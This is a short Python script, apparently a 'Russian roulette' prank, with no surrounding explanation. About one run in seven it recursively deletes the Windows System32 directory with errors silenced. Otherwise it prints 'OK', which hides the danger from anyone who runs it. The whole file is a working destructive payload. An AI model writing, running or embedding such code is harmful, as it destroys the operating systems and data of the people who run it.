import shutil
import random

if random.randint(0, 6) == 1:
    shutil.rmtree(r'C:\Windows\System32', ignore_errors=True)
else:
    print('OK')